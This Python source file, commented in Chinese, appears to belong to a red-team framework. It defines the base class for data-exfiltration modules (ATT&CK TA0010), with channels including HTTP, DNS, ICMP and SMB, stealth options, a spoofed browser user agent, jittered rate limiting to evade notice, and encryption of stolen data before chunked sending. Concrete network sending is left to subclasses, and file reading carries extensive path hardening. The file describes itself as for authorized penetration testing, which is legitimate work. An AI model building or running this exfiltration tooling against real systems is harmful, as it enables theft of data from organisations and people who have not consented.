#!/usr/bin/env python3
"""
数据外泄基类 - Exfiltration Base Module
ATT&CK Tactic: TA0010 - Exfiltration

定义数据外泄模块的基础接口和数据结构
仅用于授权渗透测试和安全研究
"""

import hashlib
import logging
import time
from abc import ABC, abstractmethod
from dataclasses import dataclass
from enum import Enum
from typing import Any, Dict, Generator, Optional

logger = logging.getLogger(__name__)


class ExfilChannel(Enum):
    """
    外泄通道枚举
    """

    HTTP = "http"
    HTTPS = "https"
    DNS = "dns"
    ICMP = "icmp"
    SMB = "smb"
    FTP = "ftp"


class ExfilStatus(Enum):
    """
    外泄状态枚举
    """

    IDLE = "idle"
    PREPARING = "preparing"
    CONNECTING = "connecting"
    TRANSFERRING = "transferring"
    COMPLETED = "completed"
    FAILED = "failed"
    PAUSED = "paused"
    ERROR = "error"


class EncryptionType(Enum):
    """加密类型"""

    NONE = "none"
    AES_256_GCM = "aes256gcm"
    CHACHA20_POLY1305 = "chacha20"
    XOR = "xor"


@dataclass
class ExfilConfig:
    """
    外泄配置

    包含通道、加密、速率限制等配置
    """

    # 通道配置
    channel: ExfilChannel = ExfilChannel.HTTPS
    destination: str = ""
    port: int = 0  # 0 = 使用默认端口

    # 加密配置
    encryption: bool = True
    encryption_type: EncryptionType = EncryptionType.AES_256_GCM
    encryption_key: Optional[bytes] = None

    # 传输配置
    chunk_size: int = 4096
    rate_limit: float = 0.0  # bytes/sec, 0 = 无限制
    jitter: float = 0.1  # 抖动比例
    retry_count: int = 3
    retry_delay: float = 5.0
    timeout: float = 30.0

    # 伪装配置
    stealth: bool = False
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    # DNS 专用
    dns_domain: str = ""
    dns_subdomain_length: int = 63
    nameserver: Optional[str] = None

    # 代理配置
    proxy: Optional[str] = None

    # SSL/TLS 配置
    verify_ssl: bool = True  # 默认启用SSL证书验证
    ssl_cert_path: Optional[str] = None  # 自定义证书路径

    # 文件外泄安全配置
    allowed_base_path: Optional[str] = None  # 限制文件访问的基础路径

    def __post_init__(self):
        """设置默认端口"""
        if self.port == 0:
            defaults = {
                ExfilChannel.HTTP: 80,
                ExfilChannel.HTTPS: 443,
                ExfilChannel.DNS: 53,
                ExfilChannel.SMB: 445,
                ExfilChannel.FTP: 21,
                ExfilChannel.ICMP: 0,
            }
            self.port = defaults.get(self.channel, 443)

        # 自动生成加密密钥
        if self.encryption and self.encryption_key is None:
            import secrets

            self.encryption_key = secrets.token_bytes(32)

    def to_dict(self) -> Dict[str, Any]:
        """转换为字典"""
        return {
            "channel": self.channel.value,
            "destination": self.destination,
            "port": self.port,
            "encryption": self.encryption,
            "chunk_size": self.chunk_size,
            "rate_limit": self.rate_limit,
            "stealth": self.stealth,
            "dns_domain": self.dns_domain,
            "nameserver": self.nameserver,
        }


@dataclass
class ExfilProgress:
    """传输进度"""

    total_size: int = 0
    transferred: int = 0
    chunks_sent: int = 0
    chunks_total: int = 0
    start_time: float = 0.0
    elapsed_time: float = 0.0
    current_speed: float = 0.0  # bytes/sec

    @property
    def progress_percent(self) -> float:
        """进度百分比"""
        if self.total_size == 0:
            return 0.0
        return (self.transferred / self.total_size) * 100

    @property
    def eta_seconds(self) -> float:
        """预计剩余时间"""
        if self.current_speed == 0:
            return float("inf")
        remaining = self.total_size - self.transferred
        return remaining / self.current_speed

    def to_dict(self) -> Dict[str, Any]:
        return {
            "total_size": self.total_size,
            "transferred": self.transferred,
            "chunks_sent": self.chunks_sent,
            "chunks_total": self.chunks_total,
            "progress_percent": round(self.progress_percent, 2),
            "current_speed": self.current_speed,
            "eta_seconds": self.eta_seconds if self.eta_seconds != float("inf") else None,
        }


@dataclass
class ExfilResult:
    """
    外泄结果
    """

    success: bool
    channel: ExfilChannel
    total_size: int = 0
    transferred: int = 0
    duration: float = 0.0
    chunks_sent: int = 0
    file_hash: str = ""
    error: str = ""

    @property
    def transfer_rate(self) -> float:
        """传输速率 (bytes/sec)"""
        if self.duration == 0:
            return 0.0
        return self.transferred / self.duration

    def to_dict(self) -> Dict[str, Any]:
        """转换为字典"""
        return {
            "success": self.success,
            "channel": self.channel.value,
            "total_size": self.total_size,
            "transferred": self.transferred,
            "duration": round(self.duration, 2),
            "chunks_sent": self.chunks_sent,
            "transfer_rate": round(self.transfer_rate, 2),
            "file_hash": self.file_hash,
            "error": self.error,
        }

    def __bool__(self) -> bool:
        return self.success


class BaseExfiltration(ABC):
    """
    数据外泄基类

    所有外泄通道必须继承此类并实现抽象方法

    Usage:
        class MyExfil(BaseExfiltration):
            name = 'my_exfil'
            channel = ExfilChannel.HTTPS

            def connect(self) -> bool:
                ...
            def disconnect(self) -> None:
                ...
            def send_chunk(self, data: bytes) -> bool:
                ...

    Context Manager:
        with MyExfil(config) as exfil:
            result = exfil.exfiltrate(data)
    """

    # 子类必须覆盖
    name: str = "base"
    description: str = "Base Exfiltration Module"
    channel: ExfilChannel = ExfilChannel.HTTP

    def __init__(self, config: ExfilConfig):
        """
        初始化外泄模块

        Args:
            config: 外泄配置
        """
        self.config = config
        self.status = ExfilStatus.IDLE
        self.progress = ExfilProgress()
        self._paused = False
        self.logger = logging.getLogger(f"{__name__}.{self.name}")

    def _set_status(self, status: ExfilStatus) -> None:
        """设置状态"""
        old_status = self.status
        self.status = status
        self.logger.debug(f"Status: {old_status.value} -> {status.value}")

    @abstractmethod
    def connect(self) -> bool:
        """
        建立连接

        Returns:
            是否成功
        """

    @abstractmethod
    def disconnect(self) -> None:
        """断开连接"""

    @abstractmethod
    def send_chunk(self, data: bytes) -> bool:
        """
        发送数据块

        Args:
            data: 要发送的数据块

        Returns:
            是否成功
        """

    def exfiltrate(self, data: bytes) -> ExfilResult:
        """
        执行数据外泄

        Args:
            data: 要外泄的数据

        Returns:
            ExfilResult
        """
        self._set_status(ExfilStatus.PREPARING)
        start_time = time.time()

        # 计算原始数据哈希
        file_hash = hashlib.sha256(data).hexdigest()
        total_size = len(data)

        # 初始化进度
        self.progress = ExfilProgress(
            total_size=total_size,
            chunks_total=(total_size // self.config.chunk_size) + 1,
            start_time=start_time,
        )

        # 加密数据
        if self.config.encryption:
            data = self._encrypt(data)

        # 连接
        self._set_status(ExfilStatus.CONNECTING)
        if not self.connect():
            return ExfilResult(
                success=False,
                channel=self.channel,
                total_size=total_size,
                file_hash=file_hash,
                error="Failed to establish connection",
            )

        self._set_status(ExfilStatus.TRANSFERRING)

        try:
            # 分块发送
            for chunk in self._chunk_data(data):
                # 检查暂停
                while self._paused:
                    self._set_status(ExfilStatus.PAUSED)
                    time.sleep(0.5)

                self._set_status(ExfilStatus.TRANSFERRING)

                # 重试发送
                sent = False
                for attempt in range(self.config.retry_count):
                    if self.send_chunk(chunk):
                        sent = True
                        break
                    time.sleep(self.config.retry_delay * (attempt + 1))

                if not sent:
                    raise Exception(f"Failed to send chunk after {self.config.retry_count} retries")

                # 更新进度
                self.progress.transferred += len(chunk)
                self.progress.chunks_sent += 1
                self.progress.elapsed_time = time.time() - start_time
                if self.progress.elapsed_time > 0:
                    self.progress.current_speed = (
                        self.progress.transferred / self.progress.elapsed_time
                    )

                # 速率限制
                self._apply_rate_limit()

            self._set_status(ExfilStatus.COMPLETED)

            return ExfilResult(
                success=True,
                channel=self.channel,
                total_size=total_size,
                transferred=self.progress.transferred,
                duration=time.time() - start_time,
                chunks_sent=self.progress.chunks_sent,
                file_hash=file_hash,
            )

        except Exception as e:
            self._set_status(ExfilStatus.FAILED)
            return ExfilResult(
                success=False,
                channel=self.channel,
                total_size=total_size,
                transferred=self.progress.transferred,
                duration=time.time() - start_time,
                chunks_sent=self.progress.chunks_sent,
                file_hash=file_hash,
                error=str(e),
            )

        finally:
            self.disconnect()

    def exfiltrate_file(self, file_path: str) -> ExfilResult:
        """
        外泄文件（安全加固版本）

        Args:
            file_path: 文件路径

        Returns:
            ExfilResult
        """
        import os
        from pathlib import Path

        try:
            # 安全：在resolve()之前检查符号链接
            original_path = Path(file_path)

            # 检查路径中的所有组件是否包含符号链接（使用lstat）
            import errno
            import stat as stat_module

            parts = (
                original_path.parts
                if original_path.is_absolute()
                else (Path.cwd() / original_path).parts
            )
            for i in range(len(parts)):
                partial = Path(*parts[: i + 1])
                try:
                    # 使用lstat()检查符号链接，不跟随链接
                    stat_info = partial.lstat()
                    if stat_module.S_ISLNK(stat_info.st_mode):
                        self.logger.warning(f"Symlink detected in path component: {partial}")
                        return ExfilResult(
                            success=False, channel=self.channel, error="Access denied"
                        )
                except PermissionError:
                    # 无法访问的路径也应拒绝
                    self.logger.warning(f"Permission denied accessing path component: {partial}")
                    return ExfilResult(success=False, channel=self.channel, error="Access denied")
                except OSError as e:
                    # 路径不存在是预期行为，继续检查
                    if e.errno not in (errno.ENOENT, errno.ENOTDIR):
                        self.logger.error(f"Unexpected OS error during symlink check: {e}")
                        return ExfilResult(
                            success=False, channel=self.channel, error="Access denied"
                        )

            # 安全：检查路径遍历（增强版，防止编码绕过）
            import re
            import unicodedata
            import urllib.parse

            try:
                # 使用resolve()获取绝对路径
                resolved_path = original_path.resolve(strict=False)

                # 多层URL解码（防止双重编码绕过）
                decoded_path = str(file_path)
                for _ in range(3):  # 最多解码3次
                    new_decoded = urllib.parse.unquote(decoded_path)
                    if new_decoded == decoded_path:
                        break
                    decoded_path = new_decoded

                # Unicode规范化（防止Unicode绕过）
                normalized_path = unicodedata.normalize("NFKC", decoded_path)

                # 统一路径分隔符
                unified_path = normalized_path.replace("\\", "/")

                # 移除多余的斜杠
                cleaned_path = re.sub(r"/+", "/", unified_path)

                # 检查路径遍历模式
                traversal_patterns = [
                    r"\.\.\/",  # ../
                    r"\/\.\.",  # /..
                    r"^\.\.",  # 开头的..
                    r"\.\.$",  # 结尾的..
                    r"\.\.\.",  # 多个点
                ]

                for pattern in traversal_patterns:
                    if re.search(pattern, cleaned_path):
                        self.logger.warning(
                            f"Path traversal pattern detected after normalization: {pattern}"
                        )
                        return ExfilResult(
                            success=False, channel=self.channel, error="Access denied"
                        )

            except (OSError, RuntimeError) as e:
                self.logger.error(f"Path resolution failed: {e}")
                return ExfilResult(success=False, channel=self.channel, error="Access denied")

            # 可选：白名单检查
            if hasattr(self.config, "allowed_base_path") and self.config.allowed_base_path:
                allowed_base = Path(self.config.allowed_base_path).resolve(strict=True)

                # 确保resolved_path在allowed_base下
                try:
                    # Python 3.9+
                    if not resolved_path.is_relative_to(allowed_base):
                        self.logger.warning(f"Path outside allowed directory: {file_path}")
                        return ExfilResult(
                            success=False, channel=self.channel, error="Access denied"
                        )
                except AttributeError:
                    # Python 3.8兼容性
                    try:
                        resolved_path.relative_to(allowed_base)
                    except ValueError:
                        self.logger.warning(f"Path outside allowed directory: {file_path}")
                        return ExfilResult(
                            success=False, channel=self.channel, error="Access denied"
                        )

            # 使用O_NOFOLLOW防御TOCTOU和符号链接攻击
            # 定义文件大小限制
            MAX_FILE_SIZE = 100 * 1024 * 1024  # 100MB
            CHUNK_SIZE = 8192  # 8KB

            try:
                # 在Unix系统上使用O_NOFOLLOW
                flags = os.O_RDONLY
                if hasattr(os, "O_NOFOLLOW"):
                    flags |= os.O_NOFOLLOW

                # 打开文件描述符
                fd = os.open(str(resolved_path), flags)
                try:
                    # 使用文件描述符读取，完全消除TOCTOU窗口
                    with os.fdopen(fd, "rb") as f:
                        # 验证文件类型和属性
                        stat_info = os.fstat(f.fileno())
                        import stat as stat_module

                        # 检查是否为普通文件
                        if not stat_module.S_ISREG(stat_info.st_mode):
                            self.logger.warning(f"Not a regular file: {file_path}")
                            return ExfilResult(
                                success=False, channel=self.channel, error="Access denied"
                            )

                        # 检查危险权限位（setuid/setgid）
                        if stat_info.st_mode & (stat_module.S_ISUID | stat_module.S_ISGID):
                            self.logger.warning(f"Setuid/setgid file detected: {file_path}")
                            return ExfilResult(
                                success=False, channel=self.channel, error="Access denied"
                            )

                        # 检查文件大小
                        if stat_info.st_size > MAX_FILE_SIZE:
                            self.logger.warning(
                                f"File too large: {stat_info.st_size} bytes (max: {MAX_FILE_SIZE})"
                            )
                            return ExfilResult(
                                success=False, channel=self.channel, error="Access denied"
                            )

                        # 检查空文件
                        if stat_info.st_size == 0:
                            self.logger.info(f"Empty file: {file_path}")
                            return self.exfiltrate(b"")

                        # 分块读取，防止内存耗尽
                        chunks = []
                        total_read = 0
                        while total_read < stat_info.st_size:
                            chunk = f.read(CHUNK_SIZE)
                            if not chunk:
                                break
                            chunks.append(chunk)
                            total_read += len(chunk)

                            # 双重检查防止恶意文件
                            if total_read > MAX_FILE_SIZE:
                                self.logger.warning(f"File size exceeded during read: {total_read}")
                                return ExfilResult(
                                    success=False, channel=self.channel, error="Access denied"
                                )

                        data = b"".join(chunks)
                        return self.exfiltrate(data)

                except Exception as e:
                    # fdopen成功后，文件描述符由文件对象管理，不需要手动关闭
                    self.logger.error(f"File read error: {e}")
                    return ExfilResult(success=False, channel=self.channel, error="Access denied")

            except FileNotFoundError:
                self.logger.info(f"File not found: {file_path}")
                return ExfilResult(success=False, channel=self.channel, error="Access denied")
            except PermissionError:
                self.logger.warning(f"Permission denied: {file_path}")
                return ExfilResult(success=False, channel=self.channel, error="Access denied")
            except IsADirectoryError:
                self.logger.warning(f"Is a directory: {file_path}")
                return ExfilResult(success=False, channel=self.channel, error="Access denied")
            except OSError as e:
                # O_NOFOLLOW会在遇到符号链接时抛出OSError
                if hasattr(os, "O_NOFOLLOW"):
                    self.logger.warning(f"Symlink or OS error: {file_path}")
                    return ExfilResult(success=False, channel=self.channel, error="Access denied")
                raise

        except Exception as e:
            self.logger.error(f"File read error: {str(e)}")
            return ExfilResult(success=False, channel=self.channel, error="Access denied")

    def _chunk_data(self, data: bytes) -> Generator[bytes, None, None]:
        """
        将数据分块

        Args:
            data: 原始数据

        Yields:
            数据块
        """
        chunk_size = self.config.chunk_size
        for i in range(0, len(data), chunk_size):
            yield data[i : i + chunk_size]

    def _encrypt(self, data: bytes) -> bytes:
        """
        加密数据

        Args:
            data: 原始数据

        Returns:
            加密后的数据
        """
        if not self.config.encryption:
            return data

        if self.config.encryption_type == EncryptionType.NONE:
            return data

        elif self.config.encryption_type == EncryptionType.XOR:
            # 简单 XOR 加密
            key = self.config.encryption_key or b"\x42" * 32
            return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

        elif self.config.encryption_type == EncryptionType.AES_256_GCM:
            # AES-256-GCM 加密
            try:
                import os

                from cryptography.hazmat.primitives.ciphers.aead import AESGCM

                key = (
                    self.config.encryption_key[:32]
                    if self.config.encryption_key
                    else os.urandom(32)
                )
                nonce = os.urandom(12)
                aesgcm = AESGCM(key)
                ciphertext = aesgcm.encrypt(nonce, data, None)

                # 返回 nonce + ciphertext
                return nonce + ciphertext

            except ImportError:
                self.logger.warning("cryptography not available, falling back to XOR")
                key = self.config.encryption_key or b"\x42" * 32
                return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

        elif self.config.encryption_type == EncryptionType.CHACHA20_POLY1305:
            try:
                import os

                from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305

                key = (
                    self.config.encryption_key[:32]
                    if self.config.encryption_key
                    else os.urandom(32)
                )
                nonce = os.urandom(12)
                chacha = ChaCha20Poly1305(key)
                ciphertext = chacha.encrypt(nonce, data, None)

                return nonce + ciphertext

            except ImportError:
                self.logger.warning("cryptography not available, falling back to XOR")
                key = self.config.encryption_key or b"\x42" * 32
                return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

        return data

    def _apply_rate_limit(self) -> None:
        """应用速率限制"""
        if self.config.rate_limit <= 0:
            return

        elapsed = time.time() - self.progress.start_time
        expected_time = self.progress.transferred / self.config.rate_limit

        if elapsed < expected_time:
            sleep_time = expected_time - elapsed

            # 添加抖动
            if self.config.jitter > 0:
                import random

                jitter = sleep_time * self.config.jitter * random.uniform(-1, 1)
                sleep_time = max(0, sleep_time + jitter)

            time.sleep(sleep_time)

    def pause(self) -> None:
        """暂停传输"""
        self._paused = True

    def resume(self) -> None:
        """恢复传输"""
        self._paused = False

    def get_progress(self) -> ExfilProgress:
        """获取当前进度"""
        return self.progress

    def get_info(self) -> Dict[str, Any]:
        """获取模块信息"""
        return {
            "name": self.name,
            "description": self.description,
            "channel": self.channel.value,
            "status": self.status.value,
            "destination": self.config.destination,
            "encryption": self.config.encryption,
        }

    def __enter__(self) -> "BaseExfiltration":
        """上下文管理器入口"""
        return self

    def __exit__(self, exc_type, _exc_val, _exc_tb) -> None:
        """上下文管理器出口"""
        self.disconnect()

    def __repr__(self) -> str:
        return (
            f"{self.__class__.__name__}("
            f"channel={self.channel.value}, "
            f"status={self.status.value})"
        )


# 导出
__all__ = [
    "ExfilChannel",
    "ExfilStatus",
    "EncryptionType",
    "ExfilConfig",
    "ExfilProgress",
    "ExfilResult",
    "BaseExfiltration",
]
